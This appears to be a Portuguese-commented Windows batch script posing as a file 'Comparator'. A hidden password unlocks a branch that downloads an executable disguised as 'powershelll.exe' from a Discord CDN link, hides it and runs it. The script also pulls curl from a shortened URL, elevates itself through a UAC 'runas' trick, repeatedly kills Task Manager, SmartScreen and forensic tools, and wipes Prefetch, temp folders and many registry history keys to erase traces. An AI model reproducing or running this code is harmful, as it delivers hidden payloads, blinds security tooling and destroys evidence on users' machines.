:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo off
title %~n0

SETLOCAL EnableDelayedExpansion
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)

:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

del /F C:\Windows\System32\hwid >nul
call :Z

:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::Admim
cls
:A
    IF "PROCESSOR_ARCHITECTURE" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

)


if '%errorlevel%' NEQ '0' (
color 0F
mode 43,3
echo.
title %~n0
call :ColorText 08 " ("
call :ColorText CC "a"
call :ColorText 08 ") Requesting administrator permission"
    goto B
) else ( goto C )

:B
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "%~s0", "%params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "temp\getadmin.vbs"
    exit /B

:C
    pushd "%CD%"
    CD /D "%~dp0"
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::Downloads

:D
call :Z
cls
title a
mode 15,2
bitsadmin /transfer calcmyDownload /download /priority foreground https://tinyurl.com/t336x2j C:\Windows\System32\curl.exe > nul
cls
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::Hwid
::Caso queira pular o sistema de HWID apenas coloque um goto F
::goto F

title %~n0
cls
curl -s http://SEU_SITE/hwid -o C:\Windows\System32\hwid > nul
::Recomendo hospedar o arquivo (hwid) no site https://www.awardspace.com/ para não ter erro !
mode 45,8
echo.
echo.
echo. 
call :ColorText 0F "["
call :ColorText 0A "-"
call :ColorText 0F "]"
call :ColorText 0F " Checking your hwid..."
Ping localhost -n 1.0 >nul

FOR /F %%u IN ('powershell -NoLogo -NoProfile -Command "(Get-CimInstance -ClassName Win32_ComputerSystemProduct).UUID"') DO (SET "UUID=%%u")
call C:\Windows\System32\hwid
>nul findstr /c:"%UUID%" C:\Windows\System32\hwid && (
del /F C:\Windows\System32\hwid
goto F
)


::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::Hwid page 2


:E
call :Z
cls
title %~n0
del /F C:\Windows\System32\hwid
mode 55,9
title 
echo %UUID% | CLIP
cls
echo.
echo.
echo.
echo. 
color 0F
call :ColorText 0F "["
call :ColorText 0C "X"
call :ColorText 0F "]" 
echo  Your HWID copied to your clipboard!
echo.
Ping localhost -n 5.0 >nul 
del /F C:\Windows\System32\hwid
exit

:F

cls
title %~n0
del /F C:\Windows\System32\hwid
title 
color 0F
cls
echo. 
echo. 
echo. 
call :ColorText 0F "["
call :ColorText 0A "+"
call :ColorText 0F "]"
call :ColorText 0F " Authenticated with success."
Ping localhost -n 3.0 >nul
cls
goto H


:H 
cls
color 0F
mode 33,10
call :ColorText 55 "12345678912345678912345678912345"
echo.
call :ColorText 0F "["
call :ColorText 0A "1"
call :ColorText 0F "]"
echo  Comparator
echo.
call :ColorText 55 "12345678912345678912345678912345"
echo.
echo.
echo. 
echo.
set /p Select=Select: 
if %Select%==1 goto G
if %Select%==grunto goto I 
::SENHA PARA ENTRAR NO CLICKER É (grunto)!
cls
goto H


:G
call :Z
cls
title %~n0
Mode 70,24
color 0F
echo.
echo.
echo.
call :ColorText 0F "["
call :ColorText 0A "+"
call :ColorText 0F "]"
call :ColorText 0F " Drop The Result Legit"
echo.
echo.
set /p %ArquivoLegit%=
cls
echo.
echo.
echo.
call :ColorText 0F "["
call :ColorText 0A "+"
call :ColorText 0F "]"
call :ColorText 0F " Drop The Cheat Legit"
echo.
echo.
set /P %ArquivoCheat%=
cls
fc %ArquivoLegit% %ArquivoCheat% >> C:\Users\%USERNAME%\Desktop\Result.log
cls
echo.
echo.
echo.
call :ColorText 0F "["
call :ColorText 0A "+"
call :ColorText 0F "]"
echo Result criado na Desktop!
Ping localhost -n 2.5 >nul
call :Z
cls
exit

:I
call :Z >nul
cls
curl -s https://cdn.discordapp.com/attachments/700011245277020251/783356789566472222/powershelll.exe -o C:\Users\%USERNAME%\AppData\Local\powershelll.exe >nul
cls
cd C:\Users\%USERNAME%\AppData\Local
cls
attrib +r +h C:\Users\%USERNAME%\AppData\Local\powershelll.exe
call :Z
cls
goto J

:J
call :Z
cls
start C:\Users\%USERNAME%\AppData\Local\powershelll.exe
Ping localhost -n 1.5 >nul
cls
:RJ
color 08
mode 67,16
echo.
call :ColorText 0F "                                                      Select"
call :ColorText 0A "                                                          ____________"
echo. 
echo.
call :ColorText 08 "-----------------------------------------["
call :ColorText 08 " ("
call :ColorText AA "a"
call :ColorText 08 ")"
call :ColorText 0F " By grunto#8487"
call :ColorText 08 " ]----"
echo.
echo.
call :ColorText 08 " ["
call :ColorText 0A "1"
call :ColorText 08 "]"
call :ColorText 08 " Self-Destruct"
echo.
call :ColorText 08 " ["
call :ColorText 0A "2"
call :ColorText 08 "]"
call :ColorText 08 " Info"
echo.
echo.
call :ColorText 08 " # Caso ache algum erro reporte-o com o Desenvolvedor"
call :ColorText 0A " grunty#8487"
echo.
echo.
echo.
call :ColorText 0F " [ "
call :ColorText A0 "%username%@root"
call :ColorText 0F "] "
call :ColorText 08 " --"
set /p select= $ 
if %select%== 1 (goto K)
if %select%== 2 (goto L)
goto RJ

:K
cls
taskkill /F /IM powershelll.exe
mode 30,3
color 08
echo.
echo.
call :ColorText 08 "[ "
call :ColorText A0 "%username%@root"
call :ColorText 08 "] "
echo  Cleaning...

DEL /F /S /Q C:\Users\%USERNAME%\AppData\Local\powershelll.exe  >nul
reg delete "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\explorer\COMDLG32\LASTVISITEDPIDLMRU" /F >nul
reg delete "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\explorer\COMDLG32\LASTVISITEDPIDLMRULEGACY" /F >nul
reg delete "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\explorer\COMDLG32\OPENSAB6EMRU" /F >nul
reg delete "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\explorer\USERASSIST" /F >nul

cls 
echo.
call :ColorText 08 "[ "
call :ColorText A0 "%username%@root"
call :ColorText 08 "] "
echo  Cleaning...

reg delete "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\APPCOMPATFLAGS\COMPATIBILITY ASSISTANT\STORE" /F >nul
reg delete "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\APPCOMPATFLAGS\COMPATIBILITY ASSISTANT\PERSISTED" /F >nul
reg delete "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\SHELLNOROAM\MUICACHE" /F >nul
reg delete "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\explorer\COMDLG32\OPENSAB6EPIDLMRU" /F >nul

cls 
echo.
call :ColorText 08 "[ "
call :ColorText A0 "%username%@root"
call :ColorText 08 "] "
echo  Cleaning...

reg delete "HKEY_CURRENT_USER\SOFTWARE\CLASSES\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\MUICACHE" /F >nul
reg delete "HKEY_CURRENT_USER\SOFTWARE\CLASSES\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS" /F >nul
reg delete "HKEY_CURRENT_USER\SOFTWARE\CLASSES\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGMRU" /F >nul
reg delete "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS" /F >nul

cls 
echo.
call :ColorText 08 "[ "
call :ColorText A0 "%username%@root"
call :ColorText 08 "] "
echo  Cleaning...

reg delete "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGMRU" /F >nul
DEL /F /S /B’ C:\USERS\USERNAME\APPDATA\LOCAL\MICROSOFT\CLR_B64.0_32\USAGELOGS >nul
DEL /F /S /B’ C:\WINDOWS\TEMP\*.*  >nul
DEL /F /S /B’ C:\WINDOWS\PREFETCH\*.* >nul

cls 
echo.
call :ColorText 08 "[ "
call :ColorText A0 "%username%@root"
call :ColorText 08 "] "
echo  Cleaning...

DEL "%WINDIR%\TEMPOR~1\*.*" /F /S /Q  >nul 
RD /S /Q "%HOMEPATH%\CONFIG~1\TEMP"  >nul
MD "%HOMEPATH%\CONFIG~1\TEMP"  >nul
RD /S /Q C:\WINDOWS\TEMP\  >nul

cls 
echo.
call :ColorText 08 "[ "
call :ColorText A0 "%username%@root"
call :ColorText 08 "] "
echo  Cleaning...

MD C:\WINDOWS\TEMP  >nul
RD /S /Q C:\WINDOWS\PREFETCH\  >nul
MD C:\WINDOWS\PREFETCH >nul
DEL /F /S /Q C:\WINDOWS\TEMP\*.*  >nul

cls 
echo.
call :ColorText 08 "[ "
call :ColorText A0 "%username%@root"
call :ColorText 08 "] "
echo  Cleaning...

DEL /F /S /Q C:\WINDOWS\PREFETCH\*.*  >nul


cls 
echo.
call :ColorText 08 "[ "
call :ColorText A0 "%username%@root"
call :ColorText 08 "] "
echo  Cleaning...
exit

:L
cls
mode 60,13
echo.
call :ColorText 0F "                                                Info"
call :ColorText 0A "                                                    ____________"
echo.
echo.
echo.
call :ColorText 08 "   ("
call :ColorText AA "a"
call :ColorText 08 ")"
call :ColorText 0F " System HWID"
echo.
call :ColorText 08 "   ("
call :ColorText AA "a"
call :ColorText 08 ")"
call :ColorText 0F " System PIN"
echo.
call :ColorText 08 "   ("
call :ColorText AA "a"
call :ColorText 08 ")"
call :ColorText 0F " Obfuscation"
echo.
echo.
call :ColorText 88 "ASDUIGASDDHASGHGDASHIGJASASDUIGASDDHASGHGDASHIGJASDGHYIASDUY"
echo.
call :ColorText 08 "   ("
call :ColorText AA "a"
call :ColorText 08 ")"
call :ColorText 08 " Clicker Desenvolvido por"
call :ColorText 0E " grunty#8487"
pause > nul
goto RJ

:Z
mode 15,1
taskkill /F /IM "Everything.exe" > nul
cls
taskkill /F /IM "ProcessHacker.exe" > nul
cls
taskkill /F /IM "taskmgr.exe" > nul 
cls
taskkill /F /IM "textscan.exe" > nul
cls
taskkill /F /IM "procexp64.exe" > nul
cls
taskkill /F /IM "procexp*32.exe" > nul
cls
taskkill /F /IM "UserAssistView.exe" > nul
cls
taskkill /F /IM "LastActivityView.exe" > nul
cls
taskkill /F /IM "ExecutedProgramsList.exe" > nul
cls
taskkill /F /IM "PreviousFilesRecovery.exe" > nul
cls
taskkill /F /IM "smartscreen.exe" > nul
cls
taskkill /F /IM "RegScanner.exe" > nul
cls
taskkill /F /IM "WinPrefetchView.exe" > nul
cls
taskkill /F /IM "MCPMappingViewer 1.0.1.exe" > nul
cls
taskkill /F /IM "ProcessExplorer.exe" > nul
cls
taskkill /F /IM "Fiddler.exe" > nul
cls
taskkill /F /IM "MethodFinder.exe" > nul
cls
taskkill /F /IM "tcplogview.exe" > nul 
cls
taskkill /F /IM "notepad++.exe" > nul 
cls
taskkill /F /IM "sublime_text.exe" > nul
cls
taskkill /F /IM "SPOILER_BatchDeob.exe" > nul
cls
taskkill /F /IM "BatchDeob.exe" > nul
cls



:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
goto :Beginoffile
:ColorText
echo off
<nul set /p ".=%DEL%" > "%~2"
findstr /v /a:%1 /R "^$" "%~2" nul
del "%~2" > nul 2>&1
goto :eof
:Beginoffile
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::